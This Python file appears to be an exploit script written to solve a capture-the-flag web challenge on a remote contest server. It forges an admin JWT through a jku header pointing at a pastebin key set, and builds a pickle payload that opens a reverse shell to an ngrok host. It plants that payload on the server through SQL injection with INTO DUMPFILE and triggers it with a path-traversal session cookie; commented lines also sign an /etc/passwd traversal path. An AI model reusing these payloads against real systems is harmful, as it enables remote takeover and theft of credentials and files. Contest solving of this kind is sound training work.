import base64
from urllib.parse import quote
from datetime import datetime
import calendar
import json
import os
import pickle
import requests
from itsdangerous import Signer
from urllib.parse import urlsplit

import jwt
import requests
from urllib3 import PoolManager


def decode_token_bypass_test(url):
    print("[-] Decoding token")
    # headers=jwt.get_unverified_header(token)
    # url=headers["jku"]
    parsed=urlsplit(url)

    print(parsed)
    if parsed.netloc.lower() and parsed.netloc.lower()!="localhost:5000":
        raise Exception("Hacker Detected")
    else:
        print("Bypassed")

        http=PoolManager()
        print(http.request("GET",url=url).data.decode('utf-8'))
        
        jwks=json.loads(http.request("GET",url=url).data.decode('utf-8'))["keys"][0]
        signing_key = jwt.algorithms.RSAAlgorithm.from_jwk(jwks)
        data=jwt.decode("xx",signing_key,algorithms=["RS256"])
        return data

def decode_token(token):
    print("[-] Decoding token")
    headers=jwt.get_unverified_header(token)
    url=headers["jku"]
    parsed=urlsplit(url)
    if parsed.netloc.lower() and parsed.netloc.lower()!="localhost:5000":
        raise Exception("Hacker Detected")
    else:
        http=PoolManager()
        jwks=json.loads(http.request("GET",url=url).data.decode('utf-8'))["keys"][0]
        signing_key = jwt.algorithms.RSAAlgorithm.from_jwk(jwks)
        data=jwt.decode(token,signing_key,algorithms=["RS256"])
        print("Verified token")
        print(data)
        return data


# print(decode_token("en40lmo7blzci.x.pipedream.net"))

def create_token(url):
    http=PoolManager()
    jwks=json.loads(http.request("GET",url=url).data.decode('utf-8'))["keys"][0]
    # print("[-] Received jwks",jwks)
    secret = open("app/keypair.pem", "r").read()
    
    token=jwt.encode({"username":"admin"},secret,algorithm="RS256",headers={"kid":"001122334455","jku":"pastebin.com/raw/ehQ5KV8s"})

    return token

    
token=create_token("https://pastebin.com/raw/ehQ5KV8s")

open ("token","w").write(token)
decode_token(token)

auth_url="http://web2.africacryptctf.online:1234/"

def get_secret():
    print("[+] Getting secret key")
	# Get secret key
    r=requests.get(f"{auth_url}/get_secret_key",headers={"Auth":token})
    print(r.text)

def get_creds():
    print("[+] Getting creds")
    r=requests.get(f"{auth_url}/get_creds",headers={"Auth":token})
    print(r.text,r.status_code)

# secret_key=get_secret()

secret_key='RandomGeneratEdSecRetKeyThatsUselessH3h3hh3333'
    


class PickleRCE(object):
    username = 'admin'
    def __reduce__(self):
        command = 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.eu.ngrok.io",17003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\''
        import os
        return (os.system,(command,))
default_url = 'http://web2.africacryptctf.online:1337/home'
# print("[+] Sending Payload to ", default_url)

  # Crafting Payload
# print(pickle.dumps(PickleRCE()))
# \x80\x03}q\x00(X\n\x00\x00\x00csrf_tokenq\x01X(\x00\x00\x00e62f16b68d9b2f1eb03c69b2d8f2ecd53710d540q\x02X\x08\x00\x00\x00usernameq\x03X\x02\x00\x00\x00aaq\x04u.
# signed_payload= Signer(secret_key).sign(payload)  # Signing Payload

# print("[+] signed picke",signed_payload)
# print("[+] signed location",f"{default_url}?session={signed_payload}")

def get(sid):
        path=os.path.abspath(os.path.join("./",sid))
        print(path)
        # f=open(path,"rb").read()
        # return f

# print(Signer(secret_key).sign("../../../../../../../../../../etc/passwd"))
# print(Signer('REDACTED').sign("../../../../../../../../../../etc/passwd_64b8aed4"))


class SessionID(object):

    def __init__(self, id, created=None):
        if None == created:
            created = datetime.utcnow()

        self.id = id
        self.created = created

    def has_expired(self, lifetime, now=None):
        now = now or datetime.utcnow()
        return now > self.created + lifetime

    def serialize(self):
        return '%x_%x' % (self.id, calendar.timegm(self.created.utctimetuple())
                          )

    @classmethod
    def unserialize(cls, string):
        id_s, created_s,*opts = string.split('_')
        return cls(int(id_s, 16),
                   datetime.utcfromtimestamp(int(created_s, 16)))



# s=SessionID().serialize()
# print(Signer(secret_key).sign(s))
# print(Signer("REDACTED").sign(s))


# get_creds()

payload ="0x"+ base64.b64encode(pickle.dumps(PickleRCE())).hex()
creds={"password":"LOnGPaSsWoRdBBImPoSSiBLeToguEssSoItSReaLLyH4rDouuuKaahlaaa","username":"admin"}

base_path="exploiti56a"
path=f"f7a69fa8d18a2c57f_64b8cd39_a47/../../../../../tmp/{base_path}"


# injection=quote(f"' UNION SELECT NULL,NULL,{payload} into DUMPFILE '/tmp/sessions/ba3614a4c43ecf83_64b8bfaa'-- -")
injection=quote(f"aaaaaaaaaaa' UNION SELECT NULL,NULL,{payload} into DUMPFILE '/tmp/{base_path}'-- -")
print(base64.b64encode(pickle.dumps(PickleRCE())))


# resp_local=requests.get(f"http://localhost/ninja_scrolls?search={injection}",
#                cookies={"session":"976a79f4b57a3a2d_64b8cf09.K7gLI35hKKQsp6BBj0W0QzOLmt4"})

resp=requests.get("http://web2.africacryptctf.online:1337/ninja_scrolls?search=${injection}",
                  cookies={"session":"ba3614a4c43ecf83_64b8bfaa.E4Clokmm6pkb97wChjxhNEKRRe8"})

# print("[+] Local response",resp_local.status_code)
print("[+] Remote responsne",resp.status_code)

signed_cookie=Signer(secret_key).sign(path).decode('utf-8')
local_signed_cookie=Signer('REDACTED').sign(path).decode('utf-8')

# pickle.loads(base64.b64decode(base64.b64encode(pickle.dumps(PickleRCE()))))

id_s, created_s,*opts = path.split('_')
print(id_s+"_"+created_s,opts)

print("[+] Signed cookie",signed_cookie)
resp=requests.get("http://web2.africacryptctf.online:1337/home",cookies={"session":signed_cookie})
print("[+] Remote responsne",resp.status_code)
# resp_local=requests.get("http://localhost/home",cookies={"session":local_signed_cookie})
# print("[+] Local response",resp_local.status_code)


print(id_s,created_s,opts)